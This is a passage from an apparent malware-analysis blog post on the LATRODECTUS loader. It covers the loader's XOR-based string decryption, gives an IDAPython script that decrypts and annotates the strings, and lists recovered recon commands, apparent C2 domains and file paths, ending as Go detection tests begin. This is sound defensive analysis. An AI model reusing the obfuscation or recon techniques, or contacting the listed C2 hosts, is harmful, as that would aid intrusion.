<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> v3;
</span></span></code></pre></div><p>through this, we can infer that <code>v3</code> is the encrypted byte being processed in the current loop iteration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> current_encrypted_byte; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> decrypted_string_length; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> xor_key; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> start_index_encrypted_string; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    xor_key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    decrypted_string_length <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    start_index_encrypted_string <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)decrypted_string_length; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        current_encrypted_byte <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(start_index_encrypted_string <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        xor_key <span style="color:#ff79c6">=</span> increment_value(xor_key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> current_encrypted_byte <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> current_encrypted_byte;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the function is now deciphered! it appears to be decrypting an encrypted string, using a combination of XOR encryption and additional arithmetic manipulation. it processes each byte of the <code>encrypted_string</code>, performs operations on it, then writes the result to <code>decrypted_string</code>.</p>
<p>here&rsquo;s a more detailed flow summary, for the curious.</p>
<p><code>xor_key</code> extracted from first 4 bytes of <code>encrypted_string</code>, and serves as the initial XOR key.</p>
<p><code>decrypted_string_length</code> is calculated by XOR-ing a 2-byte value starting at the 5th byte of <code>encrypted_string</code> with the <code>xor_key</code>. this value is the length of the <code>decrypted_string</code> to be processed.</p>
<p><code>start_index_encrypted_string</code> points to the start of the actual encrypted data within <code>encrypted_string</code>, skipping the first 6 bytes.</p>
<p>the function then enters a loop that runs <code>decrypted_string_length</code> times, processing each byte of the encrypted data.</p>
<p><code>current_encrypted_byte</code> is set to the byte at the current index <code>i</code> within the encrypted data. <code>xor_key</code> is updated using <code>increment_value</code> (altering the key for the next iteration). the byte at the current index of <code>decrypted_string</code> is first incremented by the value of <code>current_encrypted_byte</code> + 10. finally, the adjusted byte is XOR&rsquo;d with the updated <code>xor_key</code>, completing the decryption for the byte. this result is stored in <code>decrypted_string</code> at the corresponding index.</p>
<h1 id="automating-the-decryption">automating the decryption</h1>
<p>now that we know how the decryption/encryption works, automating the process to decrypt all the strings encrypted by the malware should be straightforward.</p>
<p>i&rsquo;ve included comments in the code below so you can get a better understanding of the thought process behind it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> idaapi<span style="color:#ff79c6">,</span> idc<span style="color:#ff79c6">,</span> idautils
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># find all cross-refs to given func address</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">find_fn_Xrefs</span>(fn_addr):
</span></span><span style="display:flex;"><span>    xref_list <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># iterate thru all refs to the func</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ref <span style="color:#ff79c6">in</span> idautils<span style="color:#ff79c6">.</span>XrefsTo(fn_addr):
</span></span><span style="display:flex;"><span>        xref <span style="color:#ff79c6">=</span> {}
</span></span><span style="display:flex;"><span>        xref[<span style="color:#f1fa8c">&#39;normal&#39;</span>] <span style="color:#ff79c6">=</span> ref<span style="color:#ff79c6">.</span>frm <span style="color:#6272a4"># normal address of the reference</span>
</span></span><span style="display:flex;"><span>        xref[<span style="color:#f1fa8c">&#39;hex&#39;</span>] <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">hex</span>(ref<span style="color:#ff79c6">.</span>frm) <span style="color:#6272a4"># hex address of the reference</span>
</span></span><span style="display:flex;"><span>        xref_list<span style="color:#ff79c6">.</span>append(xref) <span style="color:#6272a4"># append reference to list</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> xref_list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># get specific number of bytes from memory address</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_bytes_from_address</span>(addr, length):
</span></span><span style="display:flex;"><span>    ea <span style="color:#ff79c6">=</span> addr
</span></span><span style="display:flex;"><span>    ret_data <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytearray</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># read specified number of bytes from address</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, length):
</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> idc<span style="color:#ff79c6">.</span>get_bytes(ea <span style="color:#ff79c6">+</span> i, <span style="color:#bd93f9">1</span>) <span style="color:#6272a4"># get one byte at a time</span>
</span></span><span style="display:flex;"><span>        ret_data<span style="color:#ff79c6">.</span>append(data[<span style="color:#bd93f9">0</span>]) <span style="color:#6272a4"># append byte to bytearray</span>
</span></span><span style="display:flex;"><span>        i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> ret_data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># retrieve nth argument passed to function using fastcall</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_fastcall_args_number</span>(fn_addr, arg_number):
</span></span><span style="display:flex;"><span>    args <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>    arg_count <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    ptr_addr <span style="color:#ff79c6">=</span> fn_addr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># walk back thru instructions to find args</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
</span></span><span style="display:flex;"><span>        ptr_addr <span style="color:#ff79c6">=</span> idc<span style="color:#ff79c6">.</span>prev_head(ptr_addr) <span style="color:#6272a4"># get previous instruction</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># check for &#39;mov&#39; or &#39;lea&#39; instructions [typically set up args]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> idc<span style="color:#ff79c6">.</span>print_insn_mnem(ptr_addr) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;mov&#39;</span> <span style="color:#ff79c6">or</span> idc<span style="color:#ff79c6">.</span>print_insn_mnem(ptr_addr) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;lea&#39;</span>:
</span></span><span style="display:flex;"><span>            arg_count <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> arg_count <span style="color:#ff79c6">==</span> arg_number:
</span></span><span style="display:flex;"><span>                <span style="color:#6272a4"># if desired arg number is reached</span>
</span></span><span style="display:flex;"><span>                <span style="color:#6272a4"># determine types of operand and retrieve the value</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> idc<span style="color:#ff79c6">.</span>get_operand_type(ptr_addr, <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">==</span> idc<span style="color:#ff79c6">.</span>o_mem:
</span></span><span style="display:flex;"><span>                    args<span style="color:#ff79c6">.</span>append(idc<span style="color:#ff79c6">.</span>get_operand_value(ptr_addr, <span style="color:#bd93f9">1</span>))
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">elif</span> idc<span style="color:#ff79c6">.</span>get_operand_type(ptr_addr, <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">==</span> idc<span style="color:#ff79c6">.</span>o_imm:
</span></span><span style="display:flex;"><span>                    args<span style="color:#ff79c6">.</span>append(idc<span style="color:#ff79c6">.</span>get_operand_value(ptr_addr, <span style="color:#bd93f9">1</span>))
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">elif</span> idc<span style="color:#ff79c6">.</span>get_operand_type(ptr_addr, <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">==</span> idc<span style="color:#ff79c6">.</span>o_reg:
</span></span><span style="display:flex;"><span>                    reg_name <span style="color:#ff79c6">=</span> idaapi<span style="color:#ff79c6">.</span>get_reg_name(idc<span style="color:#ff79c6">.</span>get_operand_value(ptr_addr, <span style="color:#bd93f9">1</span>), <span style="color:#bd93f9">4</span>)
</span></span><span style="display:flex;"><span>                    reg_value <span style="color:#ff79c6">=</span> get_reg_value(ptr_addr, reg_name)
</span></span><span style="display:flex;"><span>                    args<span style="color:#ff79c6">.</span>append(reg_value)
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#6272a4"># handle cases where operand type not recognized</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;exception in get_stack_args&#34;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> args
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> args
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># decode string from bytes (utf-8 and utf-16 encoding)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decode_str</span>(s) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">str</span>:
</span></span><span style="display:flex;"><span>    is_wide_str <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">len</span>(s) <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">and</span> s[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#6272a4"># check if wide string (utf-16)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    result_str <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># decode based on encoding</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> is_wide_str:
</span></span><span style="display:flex;"><span>        result_str <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#34;utf8&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        result_str <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#34;utf-16le&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># return if result valid ASCII string</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> result_str<span style="color:#ff79c6">.</span>isascii():
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result_str
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># perform decryption on encrypted string using malware logic</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt</span>(a1):
</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytearray</span>() <span style="color:#6272a4"># hold decrypted string in bytearray</span>
</span></span><span style="display:flex;"><span>    key <span style="color:#ff79c6">=</span> a1[<span style="color:#bd93f9">0</span>] <span style="color:#6272a4"># init key with first byte of encrypted string</span>
</span></span><span style="display:flex;"><span>    result_len <span style="color:#ff79c6">=</span> a1[<span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">^</span> a1[<span style="color:#bd93f9">0</span>] <span style="color:#6272a4"># calculate length of decrypted string (using XOR)</span>
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">6</span> <span style="color:#6272a4"># offset to start of encrypted data within array</span>
</span></span><span style="display:flex;"><span>    extracted_data <span style="color:#ff79c6">=</span> a1[<span style="color:#bd93f9">6</span>:<span style="color:#bd93f9">6</span> <span style="color:#ff79c6">+</span> result_len] <span style="color:#6272a4"># extract encrypted data (bytes)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># loop thru encrypted data + decrypt each byte</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(result_len):
</span></span><span style="display:flex;"><span>        key <span style="color:#ff79c6">=</span> key <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span> <span style="color:#6272a4"># increment key</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;debug: key: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(key)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, extracted_data[i] : </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(extracted_data[i])<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, result: </span><span style="color:#f1fa8c">{</span>extracted_data[i] <span style="color:#ff79c6">^</span> key<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        result<span style="color:#ff79c6">.</span>append(extracted_data[i] <span style="color:#ff79c6">^</span> key) <span style="color:#6272a4"># XOR each byte with updated key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;debug: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">len</span>(result)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> | </span><span style="color:#f1fa8c">{</span>result<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decode_str(result) <span style="color:#6272a4"># decode + return resulting string</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># set comments in hex-rays decompiler view @ specific address</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">set_hexrays_comment</span>(address, text):
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;setting hex rays comment&#34;</span>)
</span></span><span style="display:flex;"><span>    cfunc <span style="color:#ff79c6">=</span> idaapi<span style="color:#ff79c6">.</span>decompile(address) <span style="color:#6272a4"># decompile func @ given address</span>
</span></span><span style="display:flex;"><span>    tl <span style="color:#ff79c6">=</span> idaapi<span style="color:#ff79c6">.</span>treeloc_t()
</span></span><span style="display:flex;"><span>    tl<span style="color:#ff79c6">.</span>ea <span style="color:#ff79c6">=</span> address
</span></span><span style="display:flex;"><span>    tl<span style="color:#ff79c6">.</span>itp <span style="color:#ff79c6">=</span> idaapi<span style="color:#ff79c6">.</span>ITP_SEMI
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># set comment if decompilation was successful</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> cfunc:
</span></span><span style="display:flex;"><span>        cfunc<span style="color:#ff79c6">.</span>set_user_cmt(tl, text)
</span></span><span style="display:flex;"><span>        cfunc<span style="color:#ff79c6">.</span>save_user_cmts()
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;decompile failed: </span><span style="color:#f1fa8c">{:#x}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># set comment in disassembly + decompiler view</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">set_comment</span>(address, text):
</span></span><span style="display:flex;"><span>    idc<span style="color:#ff79c6">.</span>set_cmt(address, text, <span style="color:#bd93f9">0</span>) <span style="color:#6272a4"># set comment in disassembly view</span>
</span></span><span style="display:flex;"><span>    set_hexrays_comment(address, text) <span style="color:#6272a4"># set comment in decompiler view</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># main block below</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># set address of decryption function</span>
</span></span><span style="display:flex;"><span>decryption_fn_address <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000018000ACC8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># get cross-refs to decryption func</span>
</span></span><span style="display:flex;"><span>xref_list <span style="color:#ff79c6">=</span> find_fn_Xrefs(decryption_fn_address)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># iterate over each reference</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> ref <span style="color:#ff79c6">in</span> xref_list:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;func address : </span><span style="color:#f1fa8c">{</span>ref[<span style="color:#f1fa8c">&#39;hex&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, </span><span style="color:#f1fa8c">{</span>ref[<span style="color:#f1fa8c">&#39;normal&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># retrieve first arg passed to decryption func (address of encrypted_string)</span>
</span></span><span style="display:flex;"><span>    arg_address_hex <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">hex</span>(get_fastcall_args_number(ref[<span style="color:#f1fa8c">&#39;normal&#39;</span>], <span style="color:#bd93f9">1</span>)[<span style="color:#bd93f9">0</span>])
</span></span><span style="display:flex;"><span>    arg_address <span style="color:#ff79c6">=</span> get_fastcall_args_number(ref[<span style="color:#f1fa8c">&#39;normal&#39;</span>], <span style="color:#bd93f9">1</span>)[<span style="color:#bd93f9">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># read first 6 bytes from arg address to calculate length of decrypted string</span>
</span></span><span style="display:flex;"><span>    enc_value <span style="color:#ff79c6">=</span> get_bytes_from_address(arg_address, <span style="color:#bd93f9">8</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;debug: enc_value[0] : </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(enc_value[<span style="color:#bd93f9">0</span>])<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, enc_value[4]: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(enc_value[<span style="color:#bd93f9">4</span>])<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    result_str_len <span style="color:#ff79c6">=</span> enc_value[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">^</span> enc_value[<span style="color:#bd93f9">4</span>]  <span style="color:#6272a4"># calculate decrypted string length</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;result char count : </span><span style="color:#f1fa8c">{</span>result_str_len<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># read bytes to decrypt full string</span>
</span></span><span style="display:flex;"><span>    enc_value <span style="color:#ff79c6">=</span> get_bytes_from_address(arg_address, <span style="color:#bd93f9">6</span> <span style="color:#ff79c6">+</span> result_str_len)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># proceed with decryption only if string doesn&#39;t contain invalid bytes</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\xff\xff\xff\xff</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> enc_value:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;debug: len : </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">len</span>(enc_value)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, enc_value: </span><span style="color:#f1fa8c">{</span>enc_value<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        dec_string <span style="color:#ff79c6">=</span> decrypt(enc_value)  <span style="color:#6272a4"># decrypt string</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;decrypted string: </span><span style="color:#f1fa8c">{</span>dec_string<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        set_comment(ref[<span style="color:#f1fa8c">&#39;normal&#39;</span>], dec_string)  <span style="color:#6272a4"># decrypted string as comment in IDA</span>
</span></span></code></pre></div><p>here are some of the strings that were decrypted.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-6.png" alt="xrefs"  />
</p>
</p>
<p>cross-references [xrefs] to the <code>string_decryption</code> function reveal instances where each call is associated with different strings, like <code>pid</code>, <code>%d</code>, <code>proc</code>, <code>subproc</code>, etc. these are probably used for for command execution or process management within the malware.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-7.png" alt="CLI commands"  />
</p>
</p>
<p>additional calls to <code>string_decryption</code> show CLI commands like <code>ipconfig /all</code>, <code>systeminfo</code>, <code>net view /all</code>. these are used to gather system + network information [i.e. reconnaissance].</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-8.png" alt="HTTP methods"  />
</p>
</p>
<p>more decrypted strings relating to HTTP requests, like <code>Mozilla/4.0</code>, <code>Content-Type: application/x-www-form-urlencoded</code>, and methods like <code>POST</code> and <code>GET</code>. this suggests the malware is communicating with its C2 server.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-9.png" alt="URLs"  />
</p>
</p>
<p>more decrypted strings. URLs like <code>https://scifimond.com/live/</code> and <code>https://drifajizo.fun/live/</code> show up, which are probably part of the infrastructure used for C2 communication + delivery.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-10.png" alt="copying"  />
</p>
</p>
<p>decrypted strings show file paths + registry keys, like <code>C:\WINDOWS\SYSTEM32\rundll32.exe</code> and <code>\update_data.dat</code>. this suggests that the malware copies itself to a temporary location, exits the original location, and executes from the temporary location.</p>
<h2 id="detecting-the-tactics--techniques-used-by-latrodectus">detecting the tactics + techniques used by <code>LATRODECTUS</code></h2>
<p>this malware is a sophisticated loader, designed to deliver further payloads to compromised targets. it uses a multi-stage infection process that begins with a phishing email containing a link to a JavaScript dropper. the dropper connects to the C2 server to download a <code>.msi</code> file, which loads a packed DLL when executed. the unpacked DLL then performs activities like resolving critical APIs dynamically, decrypting encrypted strings, and executing commands for recon and persistence.</p>
<h3 id="recap-dynamic-api-resolution--string-decryption">recap: dynamic API resolution + string decryption</h3>
<p>when analyzing the decompilation, i identified several dynamic API resolutions where the hashes were used to resolve addresses of critical Windows Native APIs.</p>
<p>these APIs [<code>NtAllocateVirtualMemory</code>, <code>NtCreateThread</code>, <code>VirtualProtect</code>, etc.] and their resolution allows <code>LATRODECTUS</code> to perform memory allocation, thread creation, and memory protection changes.</p>
<p><code>LATRODECTUS</code> also used a custom string decryption routine, that can decrypt various strings that are initially stored in an encrypted format within the binary. the decrypted strings include CLI arguments, URLs, registry paths, and more.</p>
<p>each major tactic + technique used by malware like <code>LATRODECTUS</code> is well-documented enough to correspond to a MITRE ATT&amp;CK rule. i wrote some more tests in <code>Go</code> (like the ones in the previous post) to extend the detection capabilities.</p>
<h3 id="oversized-windows-script-execution">oversized windows script execution</h3>
<p><code>LATRODECTUS</code> is known to be delivered via oversized JavaScript files, usually larger than 800KB, to bypass malware sandbox file upload size limits. the below script simulates creation + execution of large scripts in various formats [<code>js</code>, <code>vbs</code>, <code>hta</code>, etc.].</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
